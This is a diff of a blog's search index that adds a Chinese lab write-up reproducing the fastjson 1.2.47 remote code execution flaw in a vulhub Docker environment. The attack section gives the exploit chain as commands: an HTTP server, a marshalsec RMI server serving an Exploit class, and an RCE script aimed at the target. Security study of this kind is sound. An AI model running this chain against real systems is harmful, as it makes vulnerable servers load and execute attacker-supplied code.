@@ -1,6 +1,52 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>0x01第一个docker漏洞环境搭建复现fastjson</title>
+    <url>/2020/09/16/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/</url>
+    <content><![CDATA[<h4 id="第一个docker漏洞环境搭建复现"><a href="#第一个docker漏洞环境搭建复现" class="headerlink" title="第一个docker漏洞环境搭建复现"></a>第一个docker漏洞环境搭建复现</h4><p>由于某原因要进行fastjson漏洞的复现，已获得脚本及exp</p>
+<a id="more"></a>
+
+<h5 id="0x1-搭建docker（mac版）"><a href="#0x1-搭建docker（mac版）" class="headerlink" title="0x1 搭建docker（mac版）"></a>0x1 搭建docker（mac版）</h5><p>参考链接：<a href="https://www.runoob.com/docker/macos-docker-install.html">https://www.runoob.com/docker/macos-docker-install.html</a></p>
+<p>安装成功后进行初始化</p>
+<p><img src="/2020/09/16/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/image-20201109115207734.png" alt="image-20201109115207734"></p>
+<p>问题：发现80端口被占用</p>
+<p>解决：<a href="https://blog.csdn.net/haha223545/article/details/105244919%EF%BC%8C%E6%98%AFapache%E5%8D%A0%E7%94%A8%E4%BA%86%EF%BC%8C%E6%89%80%E4%BB%A5%E5%81%9C%E6%AD%A2apache%E6%9C%8D%E5%8A%A1%E5%8D%B3%E5%8F%AF%EF%BC%9Asudo">https://blog.csdn.net/haha223545/article/details/105244919，是apache占用了，所以停止apache服务即可：sudo</a> apachectl stop</p>
+<p><img src="/2020/09/16/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/image-20201109115229824.png" alt="image-20201109115229824"></p>
+<h5 id="0x2-从git上拉取漏洞环境靶机vulhub（mac需要装好Git）"><a href="#0x2-从git上拉取漏洞环境靶机vulhub（mac需要装好Git）" class="headerlink" title="0x2 从git上拉取漏洞环境靶机vulhub（mac需要装好Git）"></a>0x2 从git上拉取漏洞环境靶机vulhub（mac需要装好Git）</h5><p><img src="/2020/09/16/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/image-20201109115254393.png" alt="image-20201109115254393"></p>
+<p>进入后能看到有许多漏洞环境</p>
+<p><img src="/2020/09/16/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/image-20201109115311533.png" alt="image-20201109115311533"></p>
+<h5 id="0x3-使用docker"><a href="#0x3-使用docker" class="headerlink" title="0x3 使用docker"></a>0x3 使用docker</h5><p>进入对应的文件夹，使用docker-compose up</p>
+<p><img src="/2020/09/16/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/image-20201109115334588.png" alt="image-20201109115334588"></p>
+<p>成功启动，漏洞环境已经搭好</p>
+<h5 id="0x4-开始漏洞攻击复现"><a href="#0x4-开始漏洞攻击复现" class="headerlink" title="0x4 开始漏洞攻击复现"></a>0x4 开始漏洞攻击复现</h5><p>从docker中登录受害者靶机，可以查看是否有文件生成</p>
+<p>​    docker ps -a：查看ID</p>
+<p>​    docker exec -it ID /bin/bash</p>
+<p><img src="/2020/09/16/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/image-20201109115443747.png" alt="image-20201109115443747"></p>
+<p>接下来有两种方式：</p>
+<p>1、使用另一台计算机作为攻击机和服务器端，进行攻击</p>
+<p>2、使用docker搭建一个服务器端，本机作为攻击机（不然攻击机和受害机IP会相同）</p>
+<p>第一种方法实践：</p>
+<p>选择同一网段下的另一个计算机，搭建服务器端</p>
+<p>查看IP，开启python Http服务（注意要和rmi在同一文件夹下开启，不然无法访问到文件的），打开rmi服务</p>
+<p><img src="/2020/09/16/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/image-20201109114538181.png" alt="image-20201109114538181"></p>
+<p>IP为10.141.0.125，攻击语句：</p>
+<p>1、python3 -m http.server –bind 0.0.0.0 8888</p>
+<p>2、java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer “<a href="http://x.x.x.x:8888/#Exploit&quot;">http://x.x.x.x:8888/#Exploit&quot;</a> 9999</p>
+<p>3、python3 fastjson-1.2.47_rce.py <a href="http://s.s.s.s:8080/">http://s.s.s.s:8080/</a> rmi://x.x.x.x:9999/Exploit</p>
+<p>其中，第一句中的8888端口要与第二句中的8888，端口号可改但须一致，第二句中的9999和第三句中的9999，端口号可改但须一致，x.x.x.x为本机IP，即攻击者ip，s.s.s.s为受害者靶机Ip,端口8080需要根据靶机环境进行更改</p>
+<p><img src="/2020/09/16/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/image-20201109114938652.png" alt="image-20201109114938652"></p>
+<p>攻击成功后，能在受害者靶机上看到exphub文件，在http上也能看见请求</p>
+<p><img src="/2020/09/16/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/image-20201109115025283.png" alt="image-20201109115025283"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>docker</tag>
+        <tag>fastjson</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CTF-2020.6.12</title>
     <url>/2020/06/12/CTF-2020.6.12/</url>
     <content><![CDATA[<h4 id="git文件泄露导致源码泄露"><a href="#git文件泄露导致源码泄露" class="headerlink" title=".git文件泄露导致源码泄露"></a>.git文件泄露导致源码泄露</h4><p>首先，关于git：分布式版本控制系统（版本控制：记录每次文件的改动，并支持协作编辑）</p>
